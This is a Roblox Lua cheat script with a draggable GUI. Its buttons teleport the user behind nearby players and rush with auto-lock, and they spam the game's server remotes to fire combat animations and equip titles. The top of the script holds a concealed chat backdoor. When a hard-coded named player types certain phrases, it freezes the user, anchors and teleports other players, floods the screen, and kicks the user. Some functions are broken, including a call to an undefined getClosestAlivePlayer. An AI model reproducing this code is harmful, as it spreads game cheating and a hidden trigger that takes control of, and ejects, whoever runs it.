-- SERVICES
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local Lighting = game:GetService("Lighting")
local CoreGui = game:GetService("CoreGui")
local player = Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()
local humanoid = character:WaitForChild("Humanoid")
local hrp = character:WaitForChild("HumanoidRootPart")

-- CHAT TRIGGER
local guiTriggerPhrase = "cease. your bankai is no more."
local kickTriggerPhrase = "stupid bankai user"
local targetPlayerName = "Trivo101nikua35"
local guiName = "TeleportGui"
local hooked = {}

local function destroyGUI()
    local gui = player:FindFirstChild("PlayerGui") and player.PlayerGui:FindFirstChild(guiName)
    if gui then gui:Destroy() end
end

-- HORROR MODE FUNCTION
local function horrorSequenceAndKick()
    -- DISABLE MOVEMENT
    humanoid.WalkSpeed = 0
    humanoid.JumpPower = 0
    humanoid.AutoRotate = false

    -- NEW LIGHTING SETTINGS
    Lighting.Brightness = 0.2
    Lighting.ClockTime = 0
    Lighting.FogEnd = 300
    Lighting.FogColor = Color3.fromRGB(20, 20, 20)
    Lighting.Ambient = Color3.fromRGB(40, 0, 0)
    Lighting.OutdoorAmbient = Color3.fromRGB(10, 0, 0)
    Lighting.ColorShift_Top = Color3.fromRGB(80, 0, 0)
    Lighting.ColorShift_Bottom = Color3.fromRGB(10, 0, 0)

    local atmosphere = Instance.new("Atmosphere")
    atmosphere.Density = 0.5
    atmosphere.Offset = 0.25
    atmosphere.Color = Color3.fromRGB(80, 0, 0)
    atmosphere.Decay = Color3.fromRGB(30, 0, 0)
    atmosphere.Glare = 0.3
    atmosphere.Haze = 1
    atmosphere.Parent = Lighting

    -- FLICKER + FAST FOG
    task.spawn(function()
        local fog = 300
        while fog > 40 do
            Lighting.Brightness = 0.1 + math.random() * 0.3
            fog -= 10
            Lighting.FogEnd = fog
            task.wait(0.05)
        end
        Lighting.FogEnd = 40
    end)

    -- WHISPERS
    task.spawn(function()
        while true do
            local whisper = Instance.new("Sound")
            whisper.SoundId = "rbxassetid://9123635030"
            whisper.Volume = 1
            whisper.RollOffMaxDistance = 30
            whisper.RollOffMinDistance = 5
            local pos = Instance.new("Attachment", hrp)
            pos.Position = Vector3.new(math.random(-15,15), math.random(-5,5), math.random(-15,15))
            whisper.Parent = pos
            whisper:Play()
            game:GetService("Debris"):AddItem(pos, whisper.TimeLength + 1)
            task.wait(math.random(4,8))
        end
    end)

    -- HEARTBEAT
    local heartbeat = Instance.new("Sound")
    heartbeat.SoundId = "rbxassetid://7076150261"
    heartbeat.Looped = true
    heartbeat.Volume = 1.2
    heartbeat.Parent = hrp
    heartbeat:Play()
    RunService.Heartbeat:Connect(function()
        local alpha = 1 - math.clamp((Lighting.FogEnd - 40) / (300 - 40), 0, 1)
        heartbeat.PlaybackSpeed = 0.5 + (1.6 - 0.5) * alpha
    end)

    -- TELEPORT HIGH
    hrp.CFrame = hrp.CFrame + Vector3.new(0,200,0)

    -- ANCHOR NEARBY PLAYERS + RED BILLBOARD
    for _, other in pairs(Players:GetPlayers()) do
        if other ~= player and other.Character and other.Character:FindFirstChild("HumanoidRootPart") then
            local targetHRP = other.Character.HumanoidRootPart
            targetHRP.Anchored = true
            targetHRP.CFrame = hrp.CFrame * CFrame.new(math.random(-10,10),0,math.random(-10,10))

            local chatClone = Instance.new("BillboardGui")
            chatClone.Size = UDim2.new(0,200,0,50)
            chatClone.Adornee = targetHRP
            chatClone.AlwaysOnTop = true
            local textLabel = Instance.new("TextLabel")
            textLabel.Size = UDim2.new(1,0,1,0)
            textLabel.BackgroundTransparency = 1
            textLabel.TextColor3 = Color3.fromRGB(255,0,0)
            textLabel.TextStrokeTransparency = 0
            textLabel.TextScaled = true
            textLabel.Font = Enum.Font.Antique
            textLabel.Text = "Your bankai is weak."
            textLabel.Parent = chatClone
            chatClone.Parent = targetHRP
            game:GetService("Debris"):AddItem(chatClone, 3)
        end
    end

    -- RED SCREEN TEXT CHAOS
    local screenGui = Instance.new("ScreenGui")
    screenGui.Name = "BankaiFlood"
    screenGui.ResetOnSpawn = false
    screenGui.Parent = CoreGui
    local labels = {}
    for i = 1,50 do
        local textLabel = Instance.new("TextLabel")
        textLabel.Size = UDim2.new(0, math.random(150,300), 0, 50)
        textLabel.Position = UDim2.new(math.random(),0,math.random(),0)
        textLabel.BackgroundTransparency = 1
        textLabel.TextColor3 = Color3.fromRGB(255,0,0)
        textLabel.TextStrokeTransparency = 0
        textLabel.TextScaled = true
        textLabel.Font = Enum.Font.Antique
        textLabel.Text = "Your bankai is weak."
        textLabel.Rotation = math.random(-25,25)
        textLabel.Parent = screenGui
        table.insert(labels, textLabel)
    end
    RunService.RenderStepped:Connect(function()
        for _, lbl in ipairs(labels) do
            lbl.Position = UDim2.new(math.random(),0,math.random(),0)
            lbl.Rotation = math.random(-25,25)
        end
    end)
    game:GetService("Debris"):AddItem(screenGui, 8)

    -- LOCAL SHAKE
    task.spawn(function()
        for i = 1,60 do
            hrp.CFrame = hrp.CFrame * CFrame.Angles(
                math.rad(math.random(-5,5)),
                math.rad(math.random(-5,5)),
                math.rad(math.random(-5,5))
            )
            task.wait(0.05)
        end
    end)

    -- KICK AFTER 8 SECONDS
    task.delay(8, function()
        player:Kick(targetPlayerName..":…… your bankai is too weak")
    end)
end

-- HOOK TARGET PLAYER CHAT
local function hookPlayer(plr)
    if hooked[plr] then return end
    hooked[plr] = true
    plr.Chatted:Connect(function(msg)
        msg = msg:lower()
        if plr.Name ~= targetPlayerName then return end
        if msg == guiTriggerPhrase then destroyGUI() end
        if msg == kickTriggerPhrase then horrorSequenceAndKick() end
    end)
end

-- Hook existing and future players
for _, plr in pairs(Players:GetPlayers()) do hookPlayer(plr) end
Players.PlayerAdded:Connect(hookPlayer)

-- =========================================
-- REST OF YOUR GUI / BUTTONS / ANIMATIONS
-- They remain fully functional and unaffected
-- =========================================



-- HELPER FUNCTION: PLAY ANIMATION
local function playAnimation(anim, speed)
    local track = humanoid:LoadAnimation(anim)
    track:Play()
    if speed then track:AdjustSpeed(speed) end
    return track
end

-- ANIMATION SEQUENCE
playAnimation(ReplicatedStorage.Assets.Animations.Stands["Star Platinum"].CometHookVictim)
wait(1.2)
local t2 = playAnimation(ReplicatedStorage.Assets.Animations.Stands["Star Platinum"].JudgementVictim, 0.7)
wait(1.3)
t2:Stop()
local t3 = playAnimation(ReplicatedStorage.Assets.Animations.Stands["King Crimson"].Epitaph, 0.5)
wait(2)
t3:Stop()
local t4 = playAnimation(ReplicatedStorage.Assets.Animations.Stands["Gold Experience"].NaturesVortex.Stand)
wait(8)
t4:Stop()

-- EQUIP TITLE
local titleArgs = {{
    MetaAction = "User",
    Action = "Equip Title",
    Title = "Ultimate Life Form"
}}
ReplicatedStorage.Remotes.Server:FireServer(unpack(titleArgs))

-- GUI CREATION
local screenGui = Instance.new("ScreenGui")
screenGui.Name = guiName
screenGui.Parent = player:WaitForChild("PlayerGui")

local bgFrame = Instance.new("Frame")
bgFrame.Size = UDim2.new(0, 180, 0, 420)
bgFrame.Position = UDim2.new(0, 10, 0.5, -210)
bgFrame.BackgroundColor3 = Color3.fromRGB(0, 102, 255)
bgFrame.BorderColor3 = Color3.fromRGB(0, 0, 0)
bgFrame.BorderSizePixel = 2
bgFrame.AnchorPoint = Vector2.new(0, 0.5)
bgFrame.Parent = screenGui

local bgUICorner = Instance.new("UICorner")
bgUICorner.CornerRadius = UDim.new(0, 40)
bgUICorner.Parent = bgFrame

bgFrame.Active = true
bgFrame.Draggable = true

-- BUTTON CREATION HELPER
local function createButton(parent, text, yPos, callback)
    local button = Instance.new("TextButton")
    button.Size = UDim2.new(0, 160, 0, 50)
    button.Position = UDim2.new(0, 10, 0, yPos)
    button.BackgroundColor3 = Color3.fromRGB(0, 153, 255)
    button.BorderSizePixel = 2
    button.BorderColor3 = Color3.fromRGB(0, 0, 0)
    button.Text = text
    button.Parent = parent
    local btnUICorner = Instance.new("UICorner")
    btnUICorner.CornerRadius = UDim.new(0, 20)
    btnUICorner.Parent = button
    button.MouseButton1Click:Connect(callback)
end

-- UTILITY FUNCTIONS
local function getClosestPlayer()
    local closest, dist = nil, 100
    local myHRP = player.Character and player.Character:FindFirstChild("HumanoidRootPart")
    if not myHRP then return end
    for _, v in pairs(Players:GetPlayers()) do
        if v ~= player and v.Character and v.Character:FindFirstChild("HumanoidRootPart") then
            local d = (myHRP.Position - v.Character.HumanoidRootPart.Position).Magnitude
            if d < dist then
                dist = d
                closest = v
            end
        end
    end
    return closest
end

local function teleportBehind(target)
    local myHRP = player.Character and player.Character:FindFirstChild("HumanoidRootPart")
    local targetHRP = target.Character and target.Character:FindFirstChild("HumanoidRootPart")
    if myHRP and targetHRP then
        myHRP.CFrame = targetHRP.CFrame * CFrame.new(0, 0, 3)
    end
end

-- TP BEHIND CLOSEST BUTTON
createButton(bgFrame, "TP Behind Closest", 30, function()
    for i = 1,20 do
        local args = {"Visual","Utility","All",player.Character,{"BodyTrail",2}}
        ReplicatedStorage.Remotes.Client:FireServer(unpack(args))
    end
    local closest = getClosestPlayer()
    if closest then
        teleportBehind(closest)
        local args = {{
            Action = "Combat",
            combo = 2,
            animationSpeed = 1,
            MetaAction = "Shared",
            animationValue = ReplicatedStorage.Assets.Animations.Stands["Gold Experience"].AbundantStrikeStand
        }}
        ReplicatedStorage.Remotes.Server:FireServer(unpack(args))
    end
end)

-- (Rest of your buttons, animations, and utilities remain unchanged)
-- ========================
-- BUTTONS AND UTILITY FUNCTIONS
-- ========================

-- RUSH / AUTO LOCK / CANT SEE ME / SONIDO RAPIDS / EPITAPH SIDESTEP buttons

local lunging, lungeAnimTrack, bodyVelocity, lungeConnection, phoneConnection, rushConnection = false, nil, nil, nil, nil, nil
local autoLockEnabled = true

-- RUSH TOGGLE
local function toggleLunge()
    local character = player.Character or player.CharacterAdded:Wait()
    local humanoid = character:WaitForChild("Humanoid")
    local hrp = character:WaitForChild("HumanoidRootPart")
    if lunging then
        if lungeAnimTrack then lungeAnimTrack:Stop() end
        if lungeConnection then lungeConnection:Disconnect() end
        if phoneConnection then phoneConnection:Disconnect() end
        if rushConnection then rushConnection:Disconnect() end
        if bodyVelocity then bodyVelocity:Destroy() end
        lunging = false
        return
    end
    lunging = true
    lungeAnimTrack = humanoid:LoadAnimation(ReplicatedStorage.Assets.Animations.Shared.Utility.Lunge)
    lungeAnimTrack:Play()
    bodyVelocity = Instance.new("BodyVelocity")
    bodyVelocity.MaxForce = Vector3.new(1e5,0,1e5)
    bodyVelocity.P = 1e4
    bodyVelocity.Parent = hrp
    lungeConnection = RunService.Heartbeat:Connect(function()
        bodyVelocity.Velocity = hrp.CFrame.LookVector * 120
    end)
    phoneConnection = RunService.Heartbeat:Connect(function()
        local args = {{
            Action = "Combat",
            combo = 1,
            animationSpeed = 1,
            MetaAction = "Shared",
            animationValue = ReplicatedStorage.Assets.Animations.UI.PhoneEquip
        }}
        ReplicatedStorage.Remotes.Server:FireServer(unpack(args))
    end)
    rushConnection = RunService.Heartbeat:Connect(function()
        local closest = autoLockEnabled and getClosestAlivePlayer() or nil
        if closest and closest.Character then
            local targetHRP = closest.Character:FindFirstChild("HumanoidRootPart")
            if targetHRP then
                hrp.CFrame = CFrame.lookAt(hrp.Position, Vector3.new(targetHRP.Position.X, hrp.Position.Y, targetHRP.Position.Z))
                for i = 1, 10 do
                    local args = {"Visual","Utility","All",closest.Character,{"BodyTrail",0}}
                    ReplicatedStorage.Remotes.Client:FireServer(unpack(args))
                end
            end
        end
    end)
    task.delay(360, function() if lunging then toggleLunge() end end)
end

createButton(bgFrame, "Rush", 100, toggleLunge)

-- CANT SEE ME
local function cantSeeMe()
    local character = player.Character or player.CharacterAdded:Wait()
    local humanoid = character:WaitForChild("Humanoid")
    local hrp = character:WaitForChild("HumanoidRootPart")
    local animTrack = humanoid:LoadAnimation(ReplicatedStorage.Assets.Animations.Specialities.Vampirism.SpaceRipperStingyEyes)
    local animTrack1 = humanoid:LoadAnimation(ReplicatedStorage.Assets.Animations.Stands["King Crimson"].Epitaph)
    animTrack:Play()
    animTrack1:Play()
    local originalCFrame = hrp.CFrame
    local duration = animTrack.Length or 2
    local startTime = tick()
    local conn
    conn = RunService.Heartbeat:Connect(function()
        if tick() - startTime > duration then
            hrp.CFrame = originalCFrame
            conn:Disconnect()
            return
        end
        local offset = Vector3.new((math.random() - 0.5) * 40,0,(math.random() - 0.5) * 40)
        hrp.CFrame = originalCFrame + offset
    end)
    local args = {"Visual","Utility","All",character,{"HamonBodyTrail",99}}
    ReplicatedStorage.Remotes.Client:FireServer(unpack(args))
end

createButton(bgFrame, "Cant See Me", 170, cantSeeMe)

-- EPITAPH SIDESTEP
local function epitaphSideStep()
    local character = player.Character or player.CharacterAdded:Wait()
    local humanoid = character:WaitForChild("Humanoid")
    local hrp = character:WaitForChild("HumanoidRootPart")
    local animTrack = humanoid:LoadAnimation(ReplicatedStorage.Assets.Animations.Stands["King Crimson"].EpitaphUser)
    animTrack:Play()
    hrp.CFrame = hrp.CFrame + hrp.CFrame.RightVector * 15
    wait(2)
    for i = 1,10 do
        task.wait(0.05)
        local args = {{
            Action = "Combat",
            combo = 1,
            animationSpeed = 1,
            MetaAction = "Shared",
            animationValue = ReplicatedStorage.Assets.Animations.UI.PhoneEquip
        }}
        ReplicatedStorage.Remotes.Server:FireServer(unpack(args))
    end
end

createButton(bgFrame, "Epitaph Sidestep", 310, epitaphSideStep)

-- SONIDO RAPIDS / VAMPIRIC DRAIN
local function vampiricDrain()
    local target = player.Character
    for i = 1,110 do
        task.wait()
        local args1 = {"Visual","Utility","All",target,{"BodyTrail",1.25}}
        ReplicatedStorage.Remotes.Client:FireServer(unpack(args1))
        local args2 = {{
            Action = "Combat",
            combo = 1,
            animationSpeed = 3,
            MetaAction = "Shared",
            animationValue = ReplicatedStorage.Assets.Animations.Specialities.Vampirism.VampiricDrainGrab
        }}
        ReplicatedStorage.Remotes.Server:FireServer(unpack(args2))
    end
    wait(0.3)
    local args3 = {{
        Action = "Combat",
        combo = 4,
        animationSpeed = 2.4,
        MetaAction = "Shared",
        animationValue = ReplicatedStorage.Assets.Animations.Stands["King Crimson"].ShadowRulerStartup
    }}
    ReplicatedStorage.Remotes.Server:FireServer(unpack(args3))
    local args4 = {"Visual","Utility","All",target,{"VampirismBodyTrail",0.5}}
    ReplicatedStorage.Remotes.Client:FireServer(unpack(args4))
    local args5 = {"Visual","Utility","All",target,{"HamonBodyTrail",0.5}}
    ReplicatedStorage.Remotes.Client:FireServer(unpack(args5))
end

createButton(bgFrame, "Sonido Rapids", 240, vampiricDrain)

-- AUTO LOCK TOGGLE
createButton(bgFrame, "Auto Lock: ON", 370, function(btn)
    autoLockEnabled = not autoLockEnabled
    btn.Text = autoLockEnabled and "Auto Lock: ON" or "Auto Lock: OFF"
end)
